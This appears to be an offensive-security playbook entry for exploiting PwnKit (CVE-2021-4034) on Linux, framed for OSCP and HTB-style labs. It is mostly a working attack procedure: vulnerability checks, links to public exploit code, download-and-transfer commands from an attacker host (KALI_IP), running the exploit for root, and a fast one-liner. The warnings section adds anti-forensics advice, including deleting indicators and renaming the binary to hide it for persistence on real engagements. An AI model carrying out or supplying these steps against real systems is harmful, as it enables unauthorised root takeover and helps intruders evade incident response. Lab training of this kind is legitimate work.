title: PwnKit — CVE-2021-4034 Local Privilege Escalation via pkexec
body:
PwnKit is the single most reliable Linux privilege escalation on lab boxes. If you've got a low-privilege shell on Ubuntu, Debian, CentOS, or any modern Linux distribution running pre-2022 polkit, this exploit gets you root in under 30 seconds. Discovered by Qualys in January 2022, the bug had been latent in pkexec since the polkit project began in 2009 — over 12 years of vulnerable code shipping in every default Linux install.

If linpeas highlights pkexec as SUID-root and the version is unpatched, this is your first try. Always.

— THE BUG IN ONE SENTENCE —

  pkexec mishandles argument parsing when called with zero arguments,
  treating the next item on the stack (an environment variable pointer)
  as if it were argv[1]. This lets an attacker overwrite arbitrary
  environment variables with attacker-controlled data, then trick
  pkexec into loading an attacker-controlled shared library as root.

— FINGERPRINTING — IS THIS BOX VULNERABLE? —

  Three signals to confirm:

  1. PKEXEC EXISTS AND IS SUID ROOT
     ls -la /usr/bin/pkexec
     Expected: -rwsr-xr-x ... root root ... /usr/bin/pkexec
     The 's' in the permission string = SUID — runs as root regardless
     of who invokes it. That's required for the exploit.

  2. POLKIT VERSION < 0.120 (or unpatched 0.120)
     pkexec --version
     Or check the polkit package version directly:
       dpkg -l policykit-1 2>/dev/null   # Debian/Ubuntu
       rpm -qa | grep polkit             # RHEL/CentOS
     Patched versions:
       Ubuntu 18.04: policykit-1 >= 0.105-26ubuntu1.3
       Ubuntu 20.04: policykit-1 >= 0.105-26ubuntu1.2
       Ubuntu 21.10: policykit-1 >= 0.105-31ubuntu0.1
       Debian 10:    policykit-1 >= 0.105-25+deb10u1
       Debian 11:    policykit-1 >= 0.105-31+deb11u1

  3. LINPEAS / WINPEAS HIGHLIGHTS THE CVE
     When linpeas finds pkexec it annotates the line:
        /usr/bin/pkexec  --->  Linux4.10_to_5.1.17(CVE-2019-13272)/
                               rhel_6(CVE-2011-1485)/Generic_CVE-2021-4034
     The 'Generic_CVE-2021-4034' tag = PwnKit applies. linpeas does this
     check automatically — read the annotations.

— THE THREE EXPLOITATION VARIANTS — PICK ONE —

  PRIORITY 1: PRE-COMPILED BINARY (FASTEST, LAB-SAFE)
    Use ly4k/PwnKit — a single self-contained ELF that does everything.
    Download to your Kali, transfer to target, chmod, run, root.
    Total time: ~30 seconds.
    Source: https://github.com/ly4k/PwnKit
    File: PwnKit (binary, ~18KB)

  PRIORITY 2: COMPILED FROM SOURCE (WHEN BINARY DOESN'T WORK)
    arthepsy/CVE-2021-4034 is a clean C source PoC.
    Requires gcc on the target (or compile on Kali and transfer).
    Use when ly4k binary fails (architecture mismatch, glibc version, etc.)
    Source: https://github.com/arthepsy/CVE-2021-4034

  PRIORITY 3: PYTHON IMPLEMENTATION (NO BINARY/COMPILE NEEDED)
    joeammond/CVE-2021-4034 is a pure-Python implementation.
    Use when the target has no gcc and you can't transfer binaries
    (pure stdin/python pipe environments).
    Source: https://github.com/joeammond/CVE-2021-4034

— THE WINDOW OF VULNERABILITY —

  Patched: late January 2022 (CVE-2021-4034 disclosed 2022-01-25).
  Vulnerable: every Linux system with polkit installed BEFORE that date
  AND not subsequently updated.

  In labs, this means:
    PG Practice (most boxes): vulnerable
    HTB retired boxes pre-2022: vulnerable
    OSCP labs: depends on snapshot date

  In the wild as of 2026: still everywhere on systems that haven't been
  patched. Embedded systems, abandoned servers, IoT, container images
  built before 2022 — all vulnerable.

— WHY THIS WORKS WHEN OTHER EXPLOITS FAIL —

  Most local privesc exploits target a specific kernel version, distro,
  or service config. PwnKit is in userspace polkit and works regardless
  of:
  - Kernel version (works on 2.6 through 5.x)
  - Distribution (Ubuntu, Debian, RHEL, Alpine, etc.)
  - Architecture (x86_64, ARM, etc. — recompile for non-x86)
  - Hardening features (ASLR, PIE, NX — none of these block it)
  - SELinux/AppArmor (restrict what root can DO, but don't block becoming root)

  The only things that defeat it:
  - Patched polkit (the actual fix)
  - pkexec removed from the system (rare hardening)
  - SUID bit removed from pkexec (rare hardening)

— RELATED: WHEN PWNKIT FAILS, TRY THESE —

  Same family of 'works almost everywhere' Linux privesc exploits:

    DirtyPipe (CVE-2022-0847)     kernel 5.8 - 5.16.10
    DirtyCOW (CVE-2016-5195)      kernel 2.6.22 - 4.8.3
    PwnKit (CVE-2021-4034)        polkit < 0.120 (this node)
    Baron Samedit (CVE-2021-3156) sudo 1.8.2 - 1.9.5p1
    sudoedit (CVE-2023-22809)     sudo 1.9.12p1 and earlier
    OverlayFS (CVE-2023-32629)    kernel 5.11 - 6.2
    Looney Tunables (CVE-2023-4911) glibc 2.34+

  These rotate as the lab box's age changes. linpeas annotates each one
  it finds applicable. After PwnKit, check those annotations next.
cmd:
# ── STEP 1: VERIFY VULNERABILITY ─────────────────────
# In your low-priv shell on the target:

# Confirm pkexec is SUID root
ls -la /usr/bin/pkexec
# Look for: -rwsr-xr-x ... root root ...
# The 's' is what makes this work. If it's missing, exploit fails.

# Check polkit version
pkexec --version
# Or:
dpkg -l policykit-1 2>/dev/null | grep policykit-1
# Vulnerable: anything before the version cutoffs in the body section

# Quick all-in-one sanity check
echo 'pkexec exists:'; ls -la /usr/bin/pkexec
echo 'version:'; pkexec --version
echo 'distro:'; cat /etc/os-release 2>/dev/null | grep -E 'NAME|VERSION'

# ── STEP 2: DOWNLOAD THE EXPLOIT TO KALI ─────────────
mkdir -p ~/exploits/pwnkit && cd ~/exploits/pwnkit

# Option A: ly4k pre-compiled binary (PRIORITY 1)
wget https://github.com/ly4k/PwnKit/raw/main/PwnKit
chmod +x PwnKit
file PwnKit
# Expected: 'ELF 64-bit LSB executable, x86-64'

# Option B: arthepsy source (PRIORITY 2)
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
make
# Outputs: cve-2021-4034-poc-1, cve-2021-4034-poc-2, etc.

# Option C: joeammond Python (PRIORITY 3)
wget https://raw.githubusercontent.com/joeammond/CVE-2021-4034/main/CVE-2021-4034.py

# ── STEP 3: TRANSFER EXPLOIT TO TARGET ───────────────
# From your low-priv shell on target, get the exploit there:

# Method A: wget from your Kali HTTP server
# On Kali:
sudo python3 -m http.server 80
# In target shell:
cd /tmp
wget http://KALI_IP/PwnKit -O PwnKit
chmod +x PwnKit

# Method B: curl
wget http://KALI_IP/PwnKit -O /tmp/PwnKit && chmod +x /tmp/PwnKit

# Method C: base64 inline (if no network)
# On Kali:
base64 PwnKit | tr -d '\n' > /tmp/pwnkit.b64
cat /tmp/pwnkit.b64
# Copy that, paste in target shell:
echo '<paste>' | base64 -d > /tmp/PwnKit
chmod +x /tmp/PwnKit

# Method D: scp if you have SSH
scp PwnKit user@target:/tmp/

# ── STEP 4: RUN THE EXPLOIT ──────────────────────────
# In your low-priv shell:
cd /tmp
./PwnKit
# Within ~1-2 seconds:
#   # whoami
#   root
#   #

# That's it. You're root.

# ── STEP 5: STABILIZE THE ROOT SHELL ─────────────────
# PwnKit drops you in a /bin/sh by default. Upgrade it:
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Or if no python3:
/bin/bash -i

# Confirm root and capture proof
whoami
id
hostname
cat /root/proof.txt   # or /root/root.txt depending on lab

# ── ALTERNATIVE: SOURCE COMPILATION ──────────────────
# When ly4k's binary doesn't run (architecture mismatch, etc.)

# On Kali (compile for target):
git clone https://github.com/arthepsy/CVE-2021-4034.git
cd CVE-2021-4034
make
# If target is also x86_64, just transfer cve-2021-4034-poc-1
# If target is i386: CFLAGS='-m32' make

# Or compile ON the target (if gcc is available):
which gcc make
# If both exist, transfer the source instead of binary:
wget http://KALI_IP/cve-2021-4034.c -O /tmp/exploit.c
cd /tmp
make -f Makefile cve-2021-4034-poc-1
# Or single-file:
gcc -o exploit exploit.c
./exploit

# ── ALTERNATIVE: PYTHON-ONLY ─────────────────────────
# When you have no binary execution but have Python

# Transfer the script:
wget http://KALI_IP/CVE-2021-4034.py -O /tmp/pwnkit.py

# Run:
python3 /tmp/pwnkit.py

# joeammond's version writes the necessary GCONV_PATH directory and
# triggers pkexec — works without any compilation step

# ── TROUBLESHOOTING ───────────────────────────────────

# 'Permission denied' running ./PwnKit:
chmod +x ./PwnKit
# Or run with explicit interpreter (won't work for ELF, but for scripts):
bash ./PwnKit

# 'No such file or directory' but the file exists:
file ./PwnKit
# If output is 'cannot open' — file is corrupt, re-download
# If output is '32-bit' on a 64-bit system — wrong architecture, recompile

# 'pkexec: not found' or pkexec returns nothing:
which pkexec
# If empty: polkit not installed on this system. PwnKit is dead here.
# Alternatives: try other CVEs in the linpeas annotations.

# Exploit runs but doesn't elevate:
# Means polkit was patched. Check version:
pkexec --version
dpkg -l policykit-1 2>/dev/null | grep policykit-1
# If patched, move to: DirtyPipe, Baron Samedit, sudoedit, etc.

# Exploit hangs or segfaults:
# Architecture mismatch most likely. If target is x86_64 and you used a
# binary compiled elsewhere, double-check with `uname -m` on target.
# If target is non-x86 (ARM, etc.), recompile from source.

# 'Operation not permitted' even with SUID set:
# Possibly a hardening tool blocking it (AppArmor, SELinux, custom MAC).
# Check: cat /etc/apparmor.d/usr.bin.pkexec 2>/dev/null
# Some hardened configs explicitly deny pkexec exec — exploit dies there.

# ── BONUS: ONE-LINER FOR THE PG/HTB MUSCLE MEMORY ────
# When you've done this once and just want it fast:
wget http://KALI_IP/PwnKit -O /tmp/p && chmod +x /tmp/p && /tmp/p
warn:
ALWAYS DOWNLOAD TO /tmp — IT'S THE ONLY GUARANTEED WRITABLE LOCATION:
  www-data and similar service accounts often can't write to /home/user.
  /tmp is world-writable on every Linux system. Stick to /tmp for exploit
  staging unless you've confirmed write access elsewhere.

LY4K BINARY IS THE FASTEST PATH — TRY IT FIRST:
  https://github.com/ly4k/PwnKit
  18KB self-contained ELF, no dependencies, no compilation needed.
  Works on every x86_64 Linux I've tested. If it fails, then think about
  architecture or glibc compatibility issues.

VERIFY ROOT AFTER EXPLOITATION — DON'T ASSUME:
  PwnKit's success message looks the same whether you got root or just
  dropped into a new shell with weird env vars. Always verify:
    whoami
    id
  If 'whoami' returns your old user, the exploit didn't actually elevate.
  Possible causes: patched polkit, exploit binary corrupted in transfer,
  AppArmor/SELinux blocking exec.

DON'T LEAVE PWNKIT BINARY ON THE TARGET:
  After getting root, clean up your staging files. Defenders will find
  /tmp/PwnKit during incident response — it's a known-bad SHA-256.
  rm /tmp/PwnKit
  Or rename to something innocuous if you need persistence on real
  engagements: mv /tmp/PwnKit /tmp/.cache_data

PATCHED POLKIT IS A HARD WALL:
  If pkexec --version shows a patched version, NOTHING in the PwnKit
  family of exploits will work — including all the GitHub PoCs that
  claim 'updated bypass'. The fix is the fix. Move on to other CVEs.
  Check the linpeas annotations for the next viable exploit.

GCONV_PATH DEBRIS:
  PwnKit creates a directory called 'GCONV_PATH=.' (literal) and a file
  with a long random name. After exploitation, these may persist:
    ls -la /tmp/ | grep -E 'GCONV|gconv'
  Clean up:
    rm -rf '/tmp/GCONV_PATH=.'
    rm -f /tmp/<the-random-file>
  Real engagement consideration — these are obvious IoCs.

NON-X86 ARCHITECTURES NEED RECOMPILE:
  ARM64 (Raspberry Pi, AWS Graviton), 32-bit x86 (i386), etc. all need
  the source compiled for that arch. ly4k binary is x86_64 only.
  Use arthepsy's source PoC and compile with appropriate CFLAGS.

CONTAINER ESCAPES — PWNKIT WORKS INSIDE CONTAINERS:
  Yes, even inside a Docker/k8s container, PwnKit gives you root inside
  the container if pkexec is present and unpatched. That doesn't escape
  the container by itself, but root-in-container is often the first step
  toward host escape via other techniques (mount the docker socket,
  abuse cgroups release_agent, etc.).

WORKS WHERE OTHER PRIVESCS DON'T:
  Standard hardening (no SUID binaries, restrictive sudo, no kernel
  privesc) leaves pkexec because it's needed for legitimate desktop
  features. PwnKit goes through pkexec specifically because it's the
  one SUID binary you can't really remove without breaking the system.
  This is why it's still everywhere even on 'hardened' systems.

DETECTION FINGERPRINTS:
  - Process tree: pkexec called with no args, immediately spawns a shell
  - Files: 'GCONV_PATH=.' directory in /tmp
  - Environment: shell process inherits weird env vars (LD_LIBRARY_PATH,
    GCONV_PATH set to malformed values)
  - syslog: pkexec auth failure followed immediately by successful auth
  EDR will catch this on any modern engagement. Lab boxes don't care.

choices.label: Got root — capture proof and document
Need to stabilize the root shell
PwnKit failed — try DirtyPipe / other kernel CVEs
Polkit is patched — pivot to other privesc paths
Need to evaluate the public PoC before running
Got root — pivot to internal hosts
